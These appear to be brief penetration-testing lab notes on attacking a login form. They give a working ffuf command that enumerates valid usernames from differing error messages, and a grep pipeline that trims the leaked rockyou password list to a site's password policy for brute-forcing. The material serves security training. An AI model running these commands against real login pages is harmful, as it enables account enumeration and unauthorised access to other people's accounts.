____

#  Differing Error Messages

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://83.136.254.47:56265/index.php -X POST -d "username=FUZZ&password=invalid" -fr "Unknown user" -H "Content-Type: application/x-www-form-urlencoded"
```

# Brute-Forcing Passwords

- contains at least one upper-case character
- contains at least one lower-case character
- contains at least one digit
- minimum length of 10 characters

```bash
grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

